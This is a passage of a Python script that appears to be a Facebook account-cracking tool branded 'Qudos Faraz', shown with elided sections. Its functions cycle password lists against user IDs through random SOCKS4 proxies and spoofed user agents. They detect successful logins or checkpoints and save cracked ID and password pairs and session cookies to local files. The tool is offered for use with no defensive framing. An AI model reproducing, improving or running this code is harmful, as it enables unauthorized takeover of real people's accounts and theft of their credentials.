...
'Mozilla/5.0 (Linux; Android 5.0; LG-D855 Build/LRX21R.A1445306351; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/222.0.0.48.113;]',
'Mozilla/5.0 (Linux; Android 7.1.2; AFTBAMR311) AppleWebKit/537.36 (KHTML, like Gecko) Silk/108.1.135 like Chrome/108.0.5359.160 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',]
logo=("""\033[1;91m
   \033[0;93m       
 
   ___  _   _ ___   ___  ___      ___ _   ___    _    ____
  / _ \| | | |   \ / _ \/ __|    | __/_\ | _ \  /_\  |_  /
 | (_) | |_| | |) | (_) \__ \    | _/ _ \|   / / _ \  / / 
  \__\_\\___/|___/ \___/|___/    |_/_/ \_\_|_\/_/ \_\/___|
                                                          
                                                                                                                                                                                                                                                                                                                     
----------------------------------------------
\033[1;37m[-] AUTHOR    :\033[1;32m Qudos Faraz "  IS HERE
\033[0;93m[•] FACEBOOK. :. Qudos Faraz
\033[1;37m[-] GITHUB    :\033[1;32m Qudos Faraz
\033[1;37m[-] VERSION   :\033[1;32m pagal pan
...
def menu():
			...
			if anees in ['1','01']:
				...
				linex()
				print(' Example : /sdcard/Qudos-Faraz-OK.txt')
				linex()
				...
				os.system('xdg-open https://www.facebook.com/FARAZ.KHAN.G.786 ');menu()
			elif anees in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97 Qudos-Faraz\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[Qudos-Faraz-OK-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/Qudos-Faraz-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[Qudos-Faraz-OK-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/Qudos-Faraz-OK-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mSUDAIR-MAHI\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\033[1;92m[Qudos-Faraz-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/Qudos-Faraz-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\33[1;91m[Qudos-Faraz-OK-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/Qudos-Faraz-OK-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mQudos-Faraz\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[Qudos-Faraz-OK] '+cid+' | '+ps+'\033[1;32m')
				open('Qudos-Faraz-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[Qudos Faraz-CP] '+uid+' | '+ps+'\33[0;97m')
				open('Qudos-Faraz-OK-cp.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
